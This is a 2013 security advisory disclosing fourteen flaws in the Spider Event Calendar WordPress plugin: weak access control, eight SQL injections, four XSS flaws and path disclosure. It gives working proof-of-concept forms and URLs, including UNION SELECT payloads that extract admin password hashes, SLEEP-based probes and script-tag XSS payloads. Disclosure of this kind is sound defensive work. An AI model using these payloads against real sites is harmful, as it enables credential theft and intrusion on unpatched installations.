@@ -1,0 +1,591 @@
+[waraxe-2013-SA#104] - Multiple Vulnerabilities in Spider Event Calendar Wordpress Plugin
+===================================================================================
+
+Author: Janek Vind "waraxe"
+Date: 22. May 2013
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-104.html
+
+
+Description of vulnerable software:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Spider Event Calendar is a highly configurable plugin which allows you
+to have multiple organized events in a calendar. This plugin is one of
+the best WordPress Calendar available in WordPress Directory. If you
+have problem with organizing your WordPress Calendar events and displaying
+them in a calendar format, then Spider WordPress Calendar Plugin is the
+best solution.
+
+http://wordpress.org/extend/plugins/spider-event-calendar/
+http://web-dorado.com/products/wordpress-calendar.html
+
+Vulnerable is current version 1.3.0, older versions not tested.
+
+
+###############################################################################
+1. Insufficient access check for AJAX operations in "calendar.php"
+###############################################################################
+
+Reason:
+1. weak access control implementation
+Preconditions:
+1. must be logged in as Wordpress user
+Impact:
+1. Any Wordpress user can edit Spider Calendar
+
+Php script "calendar.php" line 197:
+------------------------[ source code start ]----------------------------------
+add_action('wp_ajax_spidercalendarinlineedit', 'spider_calendar_quick_edit');
+
+add_action('wp_ajax_spidercalendarinlineupdate', 'spider_calendar_quick_update');
+function spider_calendar_quick_update(){
+    
+    global $wpdb;
+    
+    if(isset($_POST['calendar_id']) && isset($_POST['calendar_title']) && isset($_POST['us_12_format_sp_calendar'])){
+        $wpdb->update(
+...
+function spider_calendar_quick_edit(){
+    global $wpdb;
+    if(isset($_POST['calendar_id'])){
+        $row=$wpdb->get_row(
+------------------------[ source code end ]------------------------------------
+
+We can see, that AJAX actions "wp_ajax_spidercalendarinlineedit" and
+"wp_ajax_spidercalendarinlineupdate" are bound to functions "spider_calendar_quick_edit"
+and "spider_calendar_quick_update". This two functions are meant to be used only
+by admin, but there is nothing to stop low privileged users. Even users with
+"Subscriber" access level can use those two AJAX functions. 
+
+Test:
+
+<html><body><center>
+<form action="http://localhost/wp351/wp-admin/admin-ajax.php?action=spidercalendarinlineedit"; method="post">
+<input type="hidden" name="calendar_id" value="1">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+
+Result: calendar editing form will be shown
+
+Remark: This weakness in access control makes next two SQL injection vulnerabilities
+much more critical - there is no need for admin privileges, even low level
+Wordpress user is able to exploit these vulnerabilities.
+
+
+###############################################################################
+2. SQL Injection in "calendar.php" function "spider_calendar_quick_update"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied POST parameter "calendar_id"
+Preconditions:
+1. must be logged in as Wordpress user
+
+
+Php script "calendar.php" line 199:
+------------------------[ source code start ]----------------------------------
+add_action('wp_ajax_spidercalendarinlineupdate', 'spider_calendar_quick_update');
+function spider_calendar_quick_update(){
+    
+    global $wpdb;
+    
+    if(isset($_POST['calendar_id']) && isset($_POST['calendar_title']) && 
+        isset($_POST['us_12_format_sp_calendar'])){
+...
+        $row=$wpdb->get_row("SELECT * FROM ".$wpdb->prefix."spidercalendar_calendar
+            WHERE id=".$_POST['calendar_id']);
+------------------------[ source code end ]------------------------------------
+
+As seen above, user-supplied POST parameter "calendar_id" is used in SQL query
+without any sanitization, resulting in SQL injection vulnerability.
+
+Test:
+
+<html><body><center>
+<form action="http://localhost/wp351/wp-admin/admin-ajax.php?action=spidercalendarinlineupdate"; method="post">
+<input type="hidden" name="calendar_title" value="1">
+<input type="hidden" name="us_12_format_sp_calendar" value="2">
+<input type="hidden" name="calendar_id" value="0 UNION SELECT 1,(SELECT 
+CONCAT_WS(0x3a,user_login,user_pass,user_email)FROM wp_users WHERE ID=1),3,4,5,6,7">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+
+Result: in case of success it will be revealed sensitive information about
+Wordpress user with ID 1: username, password hash and email.
+
+
+###############################################################################
+3. SQL Injection in "calendar.php" function "spider_calendar_quick_edit"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied POST parameter "calendar_id"
+Preconditions:
+1. must be logged in as Wordpress user
+
+
+Php script "calendar.php" line 197:
+------------------------[ source code start ]----------------------------------
+add_action('wp_ajax_spidercalendarinlineedit', 'spider_calendar_quick_edit');
+...
+function spider_calendar_quick_edit(){
+    global $wpdb;
+    if(isset($_POST['calendar_id'])){
+        $row=$wpdb->get_row("SELECT * FROM ".$wpdb->prefix."spidercalendar_calendar
+             WHERE id=".$_POST['calendar_id']);
+------------------------[ source code end ]------------------------------------
+
+We can see, that user-supplied POST parameter "calendar_id" is used in SQL query
+without any sanitization, resulting in SQL injection vulnerability.
+
+Test:
+
+<html><body><center>
+<form action="http://localhost/wp351/wp-admin/admin-ajax.php?action=spidercalendarinlineedit"; method="post">
+<input type="hidden" name="calendar_id" value="0 UNION SELECT 1,(SELECT 
+CONCAT_WS(0x3a,user_login,user_pass,user_email)FROM wp_users WHERE ID=1),3,4,5,6,7">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+
+Result: in case of success it will be revealed sensitive information about
+Wordpress user with ID 1: username, password hash and email.
+
+
+###############################################################################
+4. SQL Injection in "calendar_functions.php" function "show_spider_calendar"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied POST parameter "order_by"
+Preconditions:
+1. must be logged in as user with "manage_options" privileges (admin by default)
+
+
+Php script "calendar_functions.php" line 11:
+------------------------[ source code start ]----------------------------------
+function show_spider_calendar(){
+...
+  $sort["sortid_by"]=$_POST['order_by'];
+...
+  $order="ORDER BY ".$sort["sortid_by"]." ASC";
+...
+  $query = "SELECT * FROM ".$wpdb->prefix."spidercalendar_calendar".$where."
+           ". $order." "." LIMIT ".$limit.",20";
+  $rows = $wpdb->get_results($query);
+------------------------[ source code end ]------------------------------------
+
+We can see, that user-supplied POST parameter "order_by" is used in SQL query
+without any sanitization, resulting in SQL injection vulnerability.
+
+Example exploit:
+
+<html><body><center>
+<form action="http://localhost/wp351/wp-admin/admin.php?page=SpiderCalendar"; method="post">
+<input type="hidden" name="page_number" value="1">
+<input type="hidden" name="asc_or_desc" value="1">
+<input type="hidden" name="order_by" value="IF(1=1,1,(SELECT 1 UNION SELECT 2))">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+
+
+###############################################################################
+5. SQL Injection in "calendar_functions.php" function "show_spider_event"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied GET parameter "calendar_id" and POST parameter "order_by"
+Preconditions:
+1. must be logged in as user with "manage_options" privileges (admin by default)
+
+
+Php script "calendar.php" line 530:
+------------------------[ source code start ]----------------------------------
+if(isset($_GET["task"])){
+  $task=$_GET["task"];
+...
+if(isset($_GET["calendar_id"]))
+{
+  $calendar_id=$_GET["calendar_id"];
+...
+switch($task){
+...
+  case 'show_manage_event':
+           show_spider_event($calendar_id);
+------------------------[ source code end ]------------------------------------
+
+Php script "calendar_functions.php" line 278:
+------------------------[ source code start ]----------------------------------
+function show_spider_event($calendar_id){
+...
+  $sort["sortid_by"]=$_POST['order_by'];
+...
+  $order="ORDER BY ".$sort["sortid_by"]." ASC";
+...
+  $query = "SELECT * FROM ".$wpdb->prefix."spidercalendar_event WHERE 
+    calendar=".$calendar_id." ".$where." ". $order." "." LIMIT ".$limit.",20";
+  $rows = $wpdb->get_results($query);
+------------------------[ source code end ]------------------------------------
+
+We can see, that user-supplied GET parameter "calendar_id"  and POST parameter
+"order_by" are used in SQL query without any sanitization, resulting in SQL
+injection vulnerability.
+
+Test:
+
+http://localhost/wp351/wp-admin/admin.php?page=SpiderCalendar&;
+task=show_manage_event&calendar_id=0+UNION+SELECT+1,2,3,4,(SELECT+
+CONCAT_WS(0x3a,user_login,user_pass,user_email)FROM+wp_users+WHERE+ID=1),6,7,8
+,9,10,11,12,13,14,15,16,17
+
+Result: in case of success it will be revealed sensitive information about
+Wordpress user with ID 1: username, password hash and email.
+
+
+###############################################################################
+6. SQL Injection in "calendar_functions.php" function "spider_calendar_published"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied GET parameter "id"
+Preconditions:
+1. must be logged in as user with "manage_options" privileges (admin by default)
+
+
+Php script "calendar.php" line 530:
+------------------------[ source code start ]----------------------------------
+if(isset($_GET["task"])){
+  $task=$_GET["task"];
+...
+if(isset($_GET["id"]))
+{
+  $id=$_GET["id"];
+...
+switch($task){
+...
+  case 'published';        
+    spider_calendar_published($id);
+------------------------[ source code end ]------------------------------------
+
+Php script "calendar_functions.php" line 225:
+------------------------[ source code start ]----------------------------------
+function spider_calendar_published($id)
+{
+  global $wpdb;
+  $yes_or_no=$wpdb->get_var('SELECT published FROM 
+                    '.$wpdb->prefix.'spidercalendar_calendar WHERE `id`='.$id);
+------------------------[ source code end ]------------------------------------
+
+We can see, that user-supplied GET parameter "id" is used in SQL query without
+any sanitization, resulting in SQL injection vulnerability.
+
+Tests:
+
+http://localhost/wp351/wp-admin/admin.php?page=SpiderCalendar&task=published
+&id=IF(1=1,1,SLEEP(10))
+
+Result: normal webpage
+
+http://localhost/wp351/wp-admin/admin.php?page=SpiderCalendar&task=published
+&id=IF(1=2,1,SLEEP(10))
+
+Result: 10 second delay can be observed, SQL injection confirmed.
+
+
+###############################################################################
+7. SQL Injection in "calendar_functions.php" function "add_spider_event"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied GET parameter "calendar_id"
+Preconditions:
+1. must be logged in as user with "manage_options" privileges (admin by default)
+
+
+Php script "calendar.php" line 530:
+------------------------[ source code start ]----------------------------------
+if(isset($_GET["task"])){
+  $task=$_GET["task"];
+...
+if(isset($_GET["calendar_id"]))
+{
+  $calendar_id=$_GET["calendar_id"];
+...
+switch($task){
+...
+  case 'add_event':
+    add_spider_event($calendar_id);
+------------------------[ source code end ]------------------------------------
+
+Php script "calendar_functions.php" line 357:
+------------------------[ source code start ]----------------------------------
+function add_spider_event($calendar_id){
+    
+  global $wpdb;
+  $cal_name=$wpdb->get_var('SELECT title'.' FROM 
+            '.$wpdb->prefix.'spidercalendar_calendar WHERE id='. $calendar_id);
+  html_add_spider_event($calendar_id,$cal_name);
+------------------------[ source code end ]------------------------------------
+
+We can see, that user-supplied GET parameter "calendar_id" is used in SQL query
+without any sanitization, resulting in SQL injection vulnerability.
+
+Test:
+
+http://localhost/wp351/wp-admin/admin.php?page=SpiderCalendar&task=add_event
+&calendar_id=0+UNION+SELECT+@@version
+
+Result: MySQL version will be revealed, SQL Injection confirmed.
+
+
+###############################################################################
+8. SQL Injection in "calendar_functions.php" function "edit_spider_event"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied GET parameter "calendar_id"
+Preconditions:
+1. must be logged in as user with "manage_options" privileges (admin by default)
+
+
+Php script "calendar.php" line 530:
+------------------------[ source code start ]----------------------------------
+if(isset($_GET["task"])){
+  $task=$_GET["task"];
+...
+if(isset($_GET["calendar_id"]))
+{
+  $calendar_id=$_GET["calendar_id"];
+...
+switch($task){
+...
+  case 'edit_event':
+    edit_spider_event($calendar_id,$id);
+------------------------[ source code end ]------------------------------------
+
+Php script "calendar_functions.php" line 369:
+------------------------[ source code start ]----------------------------------
+function edit_spider_event($calendar_id,$id){
+...
+  $cal_name=$wpdb->get_var('SELECT title'.' FROM
+            '.$wpdb->prefix.'spidercalendar_calendar WHERE id='. $calendar_id);
+  html_edit_spider_event($row,$calendar_id,$id,$cal_name);
+------------------------[ source code end ]------------------------------------
+
+We can see, that user-supplied GET parameter "calendar_id" is used in SQL query
+without any sanitization, resulting in SQL injection vulnerability.
+
+Test:
+
+http://localhost/wp351/wp-admin/admin.php?page=SpiderCalendar&task=edit_event
+&id=1&calendar_id=0+UNION+SELECT+@@version
+
+Result: MySQL version will be revealed, SQL Injection confirmed.
+
+
+###############################################################################
+9. SQL Injection in "calendar_functions.php" function "published_spider_event"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of user-supplied data
+Attack vector:
+1. user-supplied GET parameter "id"
+Preconditions:
+1. must be logged in as user with "manage_options" privileges (admin by default)
+
+
+Php script "calendar.php" line 530:
+------------------------[ source code start ]----------------------------------
+if(isset($_GET["task"])){
+  $task=$_GET["task"];
+...
+if(isset($_GET["id"]))
+{
+  $id=$_GET["id"];
+...
+switch($task){
+...
+  case 'published_event';        
+    published_spider_event($id);
+------------------------[ source code end ]------------------------------------
+
+Php script "calendar_functions.php" line 575:
+------------------------[ source code start ]----------------------------------
+function published_spider_event($id)
+{
+  global $wpdb;
+  $yes_or_no=$wpdb->get_var('SELECT published FROM 
+                '.$wpdb->prefix.'spidercalendar_event WHERE `id`='.$id);
+------------------------[ source code end ]------------------------------------
+
+We can see, that user-supplied GET parameter "id" is used in SQL query without
+any sanitization, resulting in SQL injection vulnerability.
+
+Tests:
+
+http://localhost/wp351/wp-admin/admin.php?page=SpiderCalendar&task=published_event
+&id=IF(1=1,1,SLEEP(10))
+
+Result: normal webpage
+
+http://localhost/wp351/wp-admin/admin.php?page=SpiderCalendar&task=published_event
+&id=IF(1=2,1,SLEEP(10))
+
+Result: 10 second delay can be observed, SQL injection confirmed.
+
+
+###############################################################################
+10. Stored XSS in Spider Calendar title
+###############################################################################
+
+Reason:
+1. insufficient sanitization of html output
+Preconditions:
+1.  must be logged in as user with "manage_options" privileges (admin by default)
+
+Test:
+
+1. Add or edit Spider Calendar entry and set title for calendar as following:
+
+test<script>alert(123);</script>
+
+2. View calendar entry:
+
+http://localhost/wp351/wp-admin/admin.php?page=SpiderCalendar&id=2
+
+Result: javascript alert box pops up, confirming Stored XSS vulnerability.
+
+
+###############################################################################
+11. Stored XSS in Spider Calendar event title
+###############################################################################
+
+Reason:
+1. insufficient sanitization of html output
+Preconditions:
+1.  must be logged in as user with "manage_options" privileges (admin by default)
+
+Test:
+
+1. Add or edit Spider Calendar event entry and set title for event as following:
+
+test<script>alert(123);</script>
+
+2. View calendar event entry:
+
+http://localhost/wp351/wp-admin/admin.php?page=SpiderCalendar&task=show_manage_event&calendar_id=1
+
+Result: javascript alert box pops up, confirming Stored XSS vulnerability.
+
+
+###############################################################################
+12. Reflected XSS in "nav_function\nav_html_func.php"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of html output
+Attack vectors:
+1. user-supplied POST parameters "page_number" and "serch_or_not"
+Preconditions:
+1. must be logged in as user with "manage_options" privileges (admin by default)
+
+
+Test:
+
+<html><body><center>
+<form action="http://localhost/wp351/wp-admin/admin.php?page=SpiderCalendar"; method="post">
+<input type="hidden" name="page_number" value='"><script>alert(123);</script>'>
+<input type="hidden" name="serch_or_not" value='"><script>alert(456);</script>'>
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+
+Result: javascript alert boxes pop up, confirming Reflected XSS vulnerabilities.
+
+
+###############################################################################
+13. Reflected XSS in "functions_for_xml_and_ajax.php"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of html output
+Attack vectors:
+1. user-supplied GET parameters "theme_id", "calendar_id", "ev_ids" and "eventID"
+Preconditions: none
+
+
+Tests:
+
+http://localhost/wp351/wp-admin/admin-ajax.php?action=spiderbigcalendarrr&theme_id=";><script>alert(123);</script>
+http://localhost/wp351/wp-admin/admin-ajax.php?action=spiderbigcalendarrr&calendar_id=";><script>alert(123);</script>
+http://localhost/wp351/wp-admin/admin-ajax.php?action=spiderbigcalendarrr&ev_ids=";><script>alert(123);</script>
+http://localhost/wp351/wp-admin/admin-ajax.php?action=spiderbigcalendarrr&eventID=";><script>alert(123);</script>
+
+Result: javascript alert boxes pop up, confirming Reflected XSS vulnerabilities.
+
+
+###############################################################################
+14. Full Path Disclosure in multiple scripts
+###############################################################################
+
+Preconditions:
+ 1. PHP setting "display_errors = On"
+
+Tests:
+
+http://localhost/wp351/wp-content/plugins/spider-event-calendar/calendar.php
+
+Fatal error: Call to undefined function add_action() in
+C:\apache_www\wp351\wp-content\plugins\spider-event-calendar\calendar.php on line 13
+
+http://localhost/wp351/wp-content/plugins/spider-event-calendar/calendar_functions.html.php
+
+Fatal error: Call to undefined function current_user_can() in
+C:\apache_www\wp351\wp-content\plugins\spider-event-calendar\calendar_functions.html.php on line 3
+
+http://localhost/wp351/wp-content/plugins/spider-event-calendar/calendar_functions.php
+
+Fatal error: Call to undefined function current_user_can() in
+C:\apache_www\wp351\wp-content\plugins\spider-event-calendar\calendar_functions.php on line 3
+
+http://localhost/wp351/wp-content/plugins/spider-event-calendar/widget_spider_calendar.php
+
+Fatal error: Class 'WP_Widget' not found in
+C:\apache_www\wp351\wp-content\plugins\spider-event-calendar\widget_spider_calendar.php on line 7
+
+http://localhost/wp351/wp-admin/admin-ajax.php?action=spiderseemore&date[]
+
+Warning: strtotime() expects parameter 1 to be string, array given in
+C:\apache_www\wp351\wp-content\plugins\spider-event-calendar\functions_for_xml_and_ajax.php on line 1885
+
+
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe () yahoo com
+Janek Vind "waraxe"
+
+Waraxe forum:  http://www.waraxe.us/forums.html
+Personal homepage: http://www.janekvind.com/
+Random project: http://albumnow.com/
+---------------------------------- [ EOF ] ------------------------------------
